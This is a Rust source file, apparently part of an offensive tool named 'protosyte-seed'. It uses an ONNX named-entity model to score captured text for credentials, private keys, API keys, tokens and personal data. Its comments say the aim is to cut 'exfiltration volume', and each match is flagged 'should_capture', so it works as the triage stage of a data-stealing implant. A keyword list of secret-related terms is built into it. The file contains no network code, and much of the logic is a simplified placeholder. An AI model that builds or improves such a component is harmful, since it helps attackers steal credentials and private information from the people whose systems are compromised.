// AI-Driven Data Filtering using ONNX Runtime
// Performs Named Entity Recognition (NER) to identify high-value data
// Reduces false positives and exfiltration volume

use std::sync::Arc;
use std::collections::HashMap;

#[cfg(feature = "ai-filtering")]
mod ai_impl {
    use super::*;
    use ort::{Session, Value, inputs, SessionBuilder, GraphOptimizationLevel};
    use ndarray::{Array, ArrayD, IxDyn};
    use std::fs;

    pub struct AIDataFilter {
        session: Session,
        confidence_threshold: f32,
        vocabulary: HashMap<String, usize>,
    }

    impl AIDataFilter {
        /// Create a new AI filter with ONNX model
        /// 
        /// # Arguments
        /// * `model_path` - Optional path to ONNX model file. If None, tries to load embedded model.
        /// 
        /// # Model Loading Priority
        /// 1. If `model_path` provided: Load from file
        /// 2. If embedded model available: Use embedded model
        /// 3. Otherwise: Returns error (model required)
        pub fn new(model_path: Option<&str>) -> Result<Self, String> {
            // Load ONNX model
            let model_bytes = if let Some(path) = model_path {
                // Option 1: Load from provided file path
                fs::read(path)
                    .map_err(|e| format!("Failed to read model file '{}': {}", path, e))?
            } else {
                // Option 2: Try to load embedded model
                let embedded = Self::embedded_model();
                if embedded.is_empty() {
                    return Err(
                        "No model provided. Either:\n".to_string() +
                        "  1. Provide model path: AIDataFilter::new(Some(\"path/to/model.onnx\"))\n" +
                        "  2. Embed model at build time: Place model at protosyte-seed/models/ner_model.onnx\n" +
                        "     Then build with: PROTOSYTE_EMBED_MODEL=1 cargo build --features ai-filtering\n" +
                        "  3. See docs/AI_FILTERING.md and protosyte-seed/models/README.md for details"
                    );
                }
                embedded
            };

            // Create ONNX session
            let session = SessionBuilder::new()
                .map_err(|e| format!("Failed to create session builder: {}", e))?
                .with_optimization_level(GraphOptimizationLevel::All)
                .map_err(|e| format!("Failed to set optimization: {}", e))?
                .with_model_from_memory(&model_bytes)
                .map_err(|e| format!("Failed to load model: {}", e))?;

            // Build vocabulary for text tokenization
            let vocabulary = Self::build_vocabulary();

            Ok(Self {
                session,
                confidence_threshold: 0.7, // 70% confidence threshold
                vocabulary,
            })
        }

        /// Filter data using AI model
        pub fn filter(&self, data: &[u8]) -> Option<FilterResult> {
            // Convert to text if possible
            let text = match std::str::from_utf8(data) {
                Ok(t) => t,
                Err(_) => return None, // Skip binary data for now
            };

            // Tokenize text
            let tokens = self.tokenize(text);
            
            // Convert tokens to input tensor
            let input_ids = self.tokens_to_ids(&tokens);
            
            // Run inference
            let predictions = match self.run_inference(&input_ids) {
                Ok(p) => p,
                Err(_) => return None,
            };

            // Check if any high-value entity detected
            let entities = self.extract_entities(&predictions, &tokens);
            
            if entities.is_empty() {
                return None;
            }

            // Check confidence threshold
            let max_confidence = entities.iter()
                .map(|e| e.confidence)
                .fold(0.0, f32::max);

            if max_confidence < self.confidence_threshold {
                return None;
            }

            Some(FilterResult {
                entities,
                confidence: max_confidence,
                should_capture: true,
            })
        }

        fn tokenize(&self, text: &str) -> Vec<String> {
            // Simple tokenization (in production, use proper NLP tokenizer)
            text.split_whitespace()
                .map(|s| s.to_lowercase())
                .collect()
        }

        fn tokens_to_ids(&self, tokens: &[String]) -> Vec<i64> {
            tokens.iter()
                .map(|token| {
                    *self.vocabulary.get(token)
                        .or_else(|| self.vocabulary.get("<UNK>"))
                        .copied()
                        .unwrap_or(0) as i64
                })
                .collect()
        }

        fn run_inference(&self, input_ids: &[i64]) -> Result<ArrayD<f32>, String> {
            // Prepare input shape [1, sequence_length]
            let sequence_length = input_ids.len();
            let input_shape = vec![1, sequence_length];
            
            // Create input array
            let input_array = Array::from_shape_vec(input_shape, input_ids.to_vec())
                .map_err(|e| format!("Failed to create input array: {}", e))?
                .into_dyn();

            // Run model inference
            let inputs = inputs!["input_ids" => input_array]?;
            let outputs = self.session.run(inputs)
                .map_err(|e| format!("Inference failed: {}", e))?;

            // Extract predictions (assuming output is named "output")
            let output = outputs["output"]
                .try_extract_tensor::<f32>()
                .map_err(|e| format!("Failed to extract output: {}", e))?;

            Ok(output.into_dyn())
        }

        fn extract_entities(&self, predictions: &ArrayD<f32>, tokens: &[String]) -> Vec<Entity> {
            let mut entities = Vec::new();
            
            // Parse predictions (simplified - assumes BIO tagging format)
            // In production, use proper NER model output format
            let num_tokens = tokens.len().min(predictions.shape()[1]);
            
            for i in 0..num_tokens {
                // Get prediction for this token
                // Assuming shape is [1, sequence_length, num_labels]
                if predictions.ndim() >= 3 {
                    let num_labels = predictions.shape()[2];
                    let mut max_prob = 0.0f32;
                    let mut max_label = 0;
                    
                    for label in 0..num_labels {
                        let prob = predictions[[0, i, label]];
                        if prob > max_prob {
                            max_prob = prob;
                            max_label = label;
                        }
                    }
                    
                    // Map label to entity type
                    if max_prob > 0.5 {
                        if let Some(entity_type) = self.label_to_entity_type(max_label) {
                            entities.push(Entity {
                                text: tokens[i].clone(),
                                entity_type,
                                confidence: max_prob,
                                start: i,
                                end: i + 1,
                            });
                        }
                    }
                }
            }
            
            entities
        }

        fn label_to_entity_type(&self, label: usize) -> Option<EntityType> {
            // Map model labels to entity types
            // This should match your trained model's label scheme
            match label {
                0 => Some(EntityType::Credential),
                1 => Some(EntityType::PrivateKey),
                2 => Some(EntityType::ApiKey),
                3 => Some(EntityType::Token),
                4 => Some(EntityType::Pii),
                _ => None,
            }
        }

        fn build_vocabulary() -> HashMap<String, usize> {
            // Build vocabulary for tokenization
            // In production, use vocabulary from trained model
            let mut vocab = HashMap::new();
            vocab.insert("<PAD>".to_string(), 0);
            vocab.insert("<UNK>".to_string(), 1);
            vocab.insert("<CLS>".to_string(), 2);
            vocab.insert("<SEP>".to_string(), 3);
            
            // Common sensitive terms
            let sensitive_terms = vec![
                "password", "passwd", "pwd", "secret", "key", "token",
                "api", "credential", "private", "certificate", "ssh",
                "bearer", "authorization", "access", "refresh",
            ];
            
            for (idx, term) in sensitive_terms.iter().enumerate() {
                vocab.insert(term.to_string(), 4 + idx);
            }
            
            vocab
        }

        fn embedded_model() -> Vec<u8> {
            // Model embedding supports THREE methods (checked in priority order):
            //
            // 1. COMPILE-TIME EMBEDDING (Before Runtime)
            //    - Place model at: protosyte-seed/models/ner_model.onnx
            //    - Build with: PROTOSYTE_EMBED_MODEL=1 cargo build --features ai-filtering
            //    - build.rs detects model and sets 'embed_model' cfg flag
            //    - include_bytes! embeds model into binary at compile time
            //    - Result: Model is part of binary, no file needed at runtime
            //
            // 2. RUNTIME FILE DETECTION
            //    - Checks common paths where model might be placed
            //    - Allows using model without recompiling
            //
            // 3. EMPTY (triggers error with helpful instructions)
            
            // Option 1: Compile-time embedded model
            // This cfg is set by build.rs when PROTOSYTE_EMBED_MODEL=1 and model exists
            #[cfg(embed_model)]
            {
                // Model is embedded at compile time using include_bytes!
                // This only compiles if build.rs found the model and set embed_model cfg
                return include_bytes!("../models/ner_model.onnx").to_vec();
            }
            
            // Option 2: Runtime file detection (fallback)
            // Try common locations where users might place the model
            let runtime_paths = vec![
                "models/ner_model.onnx",                      // Current directory
                "../models/ner_model.onnx",                   // Parent directory
                "./ner_model.onnx",                           // Same directory as binary
                "protosyte-seed/models/ner_model.onnx",      // From project root
            ];
            
            for path in runtime_paths {
                if let Ok(bytes) = std::fs::read(path) {
                    // Found model at runtime
                    return bytes;
                }
            }
            
            // Option 3: No model found
            // Return empty - will trigger helpful error in new()
            vec![]
        }
    }

    pub struct FilterResult {
        pub entities: Vec<Entity>,
        pub confidence: f32,
        pub should_capture: bool,
    }

    pub struct Entity {
        pub text: String,
        pub entity_type: EntityType,
        pub confidence: f32,
        pub start: usize,
        pub end: usize,
    }

    #[derive(Debug, Clone)]
    pub enum EntityType {
        Credential,
        PrivateKey,
        ApiKey,
        Token,
        Pii,
    }
}

// Public API
#[cfg(feature = "ai-filtering")]
pub use ai_impl::{AIDataFilter, FilterResult, Entity, EntityType};

#[cfg(not(feature = "ai-filtering"))]
pub struct AIDataFilter;

#[cfg(not(feature = "ai-filtering"))]
impl AIDataFilter {
    pub fn new(_model_path: Option<&str>) -> Result<Self, String> {
        Err("AI filtering feature not enabled. Build with --features ai-filtering".to_string())
    }
    
    pub fn filter(&self, _data: &[u8]) -> Option<FilterResult> {
        None
    }
}

#[cfg(not(feature = "ai-filtering"))]
pub struct FilterResult {
    pub should_capture: bool,
}

#[cfg(not(feature = "ai-filtering"))]
pub struct Entity;

#[cfg(not(feature = "ai-filtering"))]
pub enum EntityType {
    Credential,
}

